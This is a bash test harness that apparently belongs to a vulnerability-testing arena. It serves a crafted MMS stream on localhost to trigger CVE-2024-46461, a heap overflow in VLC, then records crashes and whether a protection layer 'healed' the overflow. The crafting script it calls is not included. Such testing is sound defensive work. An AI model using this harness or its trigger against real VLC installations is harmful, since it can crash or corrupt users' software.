#!/usr/bin/env bash
# CVE-2024-46461 trigger harness for VLC MMS integer overflow
#
# The vulnerability is in VLC's MMS protocol access module. When parsing
# MMS stream headers, an integer overflow in the content length field
# causes a heap buffer to be allocated with an incorrectly small size.
# The subsequent data copy writes past the end of the undersized buffer.
#
# This script:
# 1. Generates a crafted MMS stream file using craft_mms.py
# 2. Starts a minimal TCP server serving the crafted MMS data
# 3. Runs VLC (headless) pointing at the MMS stream
# 4. Captures crash/healing results
set -euo pipefail

RESULT_FILE="/cve_arena/result.json"
MMS_FILE="/tmp/crafted_mms.bin"
MMS_PORT=1755
SERVER_PID=""
SERVER_LOG="/tmp/mms_server.log"

cleanup() {
    if [ -n "${SERVER_PID}" ] && kill -0 "${SERVER_PID}" 2>/dev/null; then
        kill "${SERVER_PID}" 2>/dev/null || true
        wait "${SERVER_PID}" 2>/dev/null || true
    fi
    rm -f "${MMS_FILE}"
}
trap cleanup EXIT

echo "[cve_arena] CVE-2024-46461: VLC MMS stream integer overflow"
echo "[cve_arena] VLC version: $(cvlc --version 2>&1 | head -1 || echo 'unknown')"

# Step 1: Generate the crafted MMS stream
echo "[cve_arena] Generating crafted MMS stream..."
python3 /cve_arena/craft_mms.py --output "${MMS_FILE}" --port "${MMS_PORT}" --serve &
SERVER_PID=$!

# Wait for server to start
sleep 2
if ! kill -0 "${SERVER_PID}" 2>/dev/null; then
    echo "[cve_arena] ERROR: MMS server failed to start"
    cat "${SERVER_LOG}" 2>/dev/null || true
    echo '{"status":"error","reason":"mms_server_failed"}' > "${RESULT_FILE}"
    exit 1
fi
echo "[cve_arena] MMS server running on port ${MMS_PORT} (PID ${SERVER_PID})"

CRASHED=false
SIGNAL=""
HEALED=false
HEALING_ACTIONS="[]"

# Step 2: Run VLC against the crafted MMS stream
echo "[cve_arena] Running VLC against crafted MMS stream..."

# Use cvlc (console VLC) with no video output
# --run-time limits execution, --play-and-exit stops after stream ends
set +e
VLC_OUTPUT=$(timeout 15 cvlc \
    --no-video \
    --no-audio \
    --vout none \
    --aout none \
    --no-spu \
    --intf dummy \
    --run-time 10 \
    --play-and-exit \
    --verbose 2 \
    "mms://127.0.0.1:${MMS_PORT}/stream" 2>&1)
VLC_EXIT=$?
set -e

echo "[cve_arena] VLC exit code: ${VLC_EXIT}"
echo "[cve_arena] VLC output (first 500 chars): ${VLC_OUTPUT:0:500}"

# Check for crash signals
if [ ${VLC_EXIT} -ge 128 ]; then
    SIGNAL_NUM=$((VLC_EXIT - 128))
    case ${SIGNAL_NUM} in
        6)  SIGNAL="SIGABRT" ;;
        9)  SIGNAL="SIGKILL" ;;
        11) SIGNAL="SIGSEGV" ;;
        7)  SIGNAL="SIGBUS"  ;;
        *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
    esac
    CRASHED=true
    echo "[cve_arena] VLC crashed with signal: ${SIGNAL}"
fi

# Also check for crash indicators in VLC verbose output
if echo "${VLC_OUTPUT}" | grep -qiE "segmentation fault|aborted|signal 11|signal 6"; then
    CRASHED=true
    if [ -z "${SIGNAL}" ]; then
        SIGNAL=$(echo "${VLC_OUTPUT}" | grep -oiE "segmentation fault|SIGSEGV|SIGABRT" | head -1)
    fi
fi

# Step 3: Try with the crafted file directly (if MMS protocol didn't trigger)
if [ "${CRASHED}" = "false" ] && [ -f "${MMS_FILE}" ]; then
    echo "[cve_arena] Trying direct file access to crafted MMS data..."
    set +e
    VLC_OUTPUT2=$(timeout 15 cvlc \
        --no-video \
        --no-audio \
        --vout none \
        --aout none \
        --no-spu \
        --intf dummy \
        --run-time 10 \
        --play-and-exit \
        --demux mms \
        --verbose 2 \
        "${MMS_FILE}" 2>&1)
    VLC_EXIT2=$?
    set -e

    echo "[cve_arena] Direct access exit code: ${VLC_EXIT2}"

    if [ ${VLC_EXIT2} -ge 128 ]; then
        SIGNAL_NUM=$((VLC_EXIT2 - 128))
        case ${SIGNAL_NUM} in
            6)  SIGNAL="SIGABRT" ;;
            11) SIGNAL="SIGSEGV" ;;
            *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
        esac
        CRASHED=true
        echo "[cve_arena] Crashed with signal: ${SIGNAL}"
    fi
    VLC_OUTPUT="${VLC_OUTPUT}${VLC_OUTPUT2:-}"
fi

# Check for TSM healing signals
if echo "${VLC_OUTPUT}" | grep -qiE "TSM_HEAL|ClampSize|integer_overflow_detected|alloc_size_clamped"; then
    HEALED=true
    HEALING_ACTIONS=$(echo "${VLC_OUTPUT}" | \
        grep -oiE "TSM_HEAL[^ ]*|ClampSize|integer_overflow_detected|alloc_size_clamped|ReallocAsMalloc" | \
        sort -u | jq -R -s 'split("\n") | map(select(length > 0))')
fi

# Build result JSON
jq -n \
    --arg cve "CVE-2024-46461" \
    --arg software "vlc" \
    --arg version "3.0.20" \
    --argjson vlc_exit "${VLC_EXIT}" \
    --argjson crashed "${CRASHED}" \
    --arg signal "${SIGNAL}" \
    --argjson healed "${HEALED}" \
    --argjson healing_actions "${HEALING_ACTIONS}" \
    '{
        cve: $cve,
        software: $software,
        version: $version,
        vlc_exit_code: $vlc_exit,
        crashed: $crashed,
        crash_signal: $signal,
        tsm_healed: $healed,
        tsm_healing_actions: $healing_actions,
        timestamp: (now | todate)
    }' > "${RESULT_FILE}"

echo "[cve_arena] Result:"
cat "${RESULT_FILE}"

if [ "${CRASHED}" = "true" ]; then
    echo "[cve_arena] VERDICT: VULNERABLE (crash detected: ${SIGNAL})"
    exit 2
elif [ "${HEALED}" = "true" ]; then
    echo "[cve_arena] VERDICT: PROTECTED (TSM healed the integer overflow)"
    exit 0
else
    echo "[cve_arena] VERDICT: INCONCLUSIVE"
    exit 3
fi
